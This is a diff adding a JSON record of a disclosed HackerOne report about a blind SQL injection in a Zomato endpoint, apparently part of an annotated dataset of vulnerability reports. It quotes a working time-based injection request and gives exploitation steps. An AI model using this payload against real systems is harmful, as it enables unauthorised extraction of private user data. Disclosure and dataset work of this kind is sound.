@@ -1,0 +1,42 @@
+{
+    "reported_to": "Zomato",
+    "reported_by": "zzzhacker13 ",
+    "title": "[www.zomato.com] Blind SQL Injection in /php/geto2banner",
+    "content": "\nHi Team!\nOur team discovered a Blind SQL Injection by Abusing LocalParams (res_id) in /php/geto2banner\nWe are working to create a full PDF Report as an WriteUp ;)\nHere is a Temporal Exploit based on the Vulnerable request:\nCode 402 Bytes\n1POST /php/geto2banner HTTP/1.1\n2Host: www.zomato.com\n3Connection: close\n4Content-Length: 73\n5User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36\n6Content-type: application/x-www-form-urlencoded\n7Accept: */*\n8Accept-Encoding: gzip, deflate\n9Accept-Language: en\n10\n11res_id=51-CASE/**/WHEN(LENGTH(version())=10)THEN(SLEEP(6*1))END&city_id=0\nThank you so much!!\nAs you can see in the request - we are able to Exploit it to extract data from your DB!\nImpact\nFull database access holding private user information.\n\n",
+    "severity": [
+        9.0,
+        10.0
+    ],
+    "bounty": 2000,
+    "weaknesses": [
+        "SQL Injection"
+    ],
+    "screenshots": {},
+    "disclosed_date": 1597080420,
+    "report_url": "https://hackerone.com/reports/838855",
+    "is_multi_component": false,
+    "complexity": "MEDIUM",
+    "novelty": "MEDIUM",
+    "vuln_category": "WEB_APP",
+    "steps": [
+        [
+            1,
+            "Send a POST request to /php/geto2banner with a manipulated res_id parameter containing a SQL injection payload."
+        ],
+        [
+            2,
+            "Observe the response time to determine if the SQL injection was successful (e.g., delayed response indicates a successful injection)."
+        ]
+    ],
+    "vuln_description": "The vulnerability is a Blind SQL Injection in the /php/geto2banner endpoint of www.zomato.com, where the res_id parameter is not properly sanitized, allowing an attacker to execute arbitrary SQL queries and potentially extract sensitive data from the database.",
+    "reason": "The attack involves a single component (the res_id parameter) and a straightforward SQL injection technique. The interaction is not subtle or non-obvious, and the application state manipulation is minimal. The logic is common for SQL injection vulnerabilities.",
+    "new_complexity": "LOW",
+    "requires_code": false,
+    "requires_CVE": false,
+    "is_ctf": false,
+    "other_report": null,
+    "authnz_metadata": {
+        "reason": "The Blind SQL Injection vulnerability involves injecting SQL queries through the 'res_id' parameter, which is not directly related to authentication or authorization bypass. The proposed methodologies focus on testing AuthN/AuthZ boundaries by swapping user sessions or resource IDs, not on detecting SQL injection vulnerabilities.",
+        "is_detectable": false
+    }
+}
